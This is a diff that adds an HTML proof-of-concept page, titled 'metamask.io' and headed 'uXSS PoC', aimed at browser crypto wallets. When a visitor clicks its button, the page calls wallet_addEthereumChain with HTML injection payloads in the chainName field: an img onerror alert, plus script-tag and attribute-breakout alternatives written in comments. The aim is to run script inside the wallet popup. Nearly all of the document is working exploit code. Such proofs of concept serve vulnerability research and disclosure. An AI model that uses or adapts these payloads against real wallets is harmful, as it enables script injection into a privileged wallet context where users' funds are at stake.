@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>metamask.io</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: system-ui, sans-serif;
+      text-align: center;
+      padding-top: 20vh;
+    }
+    h1 {
+      font-size: 32px;
+      margin-bottom: 40px;
+    }
+    button {
+      width: 70%;
+      height: 15vh;
+      font-size: 40px;
+      background: #f6851b;
+      color: white;
+      border: none;
+      border-radius: 20px;
+      cursor: pointer;
+      box-shadow: 0 10px 40px rgba(246,133,27,0.6);
+    }
+    button:hover {
+      background: #e2761b;
+    }
+    .warn {
+      margin-top: 40px;
+      color: #ffcc00;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>uXSS PoC</h1>
+  <button onclick="exploit()">Press me!</button>
+  <p class="warn">Warning: XSS via chainName → alert(document.domain) in wallet popup!</p>
+
+  <script>
+    async function exploit() {
+      try {
+        const provider = window.ethereum || (window.web3 && window.web3.currentProvider);
+
+        if (!provider || !provider.request) {
+          alert("No wallet detected");
+          return;
+        }
+
+        // XSS PAYLOAD DI chainName
+        await provider.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: "0x31339",
+            chainName: "<img src=x onerror=alert(document.domain)> Evil Chain", // XSS via img onerror
+            // Alternatif: "<script>alert(document.domain)"
+            // Alternatif: "\" onload=\"alert(document.domain)\" style=\""
+            rpcUrls: ["https://rpc-mumbai.matic.today/"],
+            nativeCurrency: {
+              name: "MATIC",
+              symbol: "MATIC",
+              decimals: 18
+            },
+            blockExplorerUrls: ["https://mumbai.polygonscan.com"]
+          }]
+        });
+
+        alert("wallet_addEthereumChain triggered! Check if alert popped in wallet context.");
+
+      } catch (err) {
+        alert("Rejected or failed: " + (err.message || err));
+        console.error(err);
+      }
+    }
+  </script>
+
+</body>
+</html>
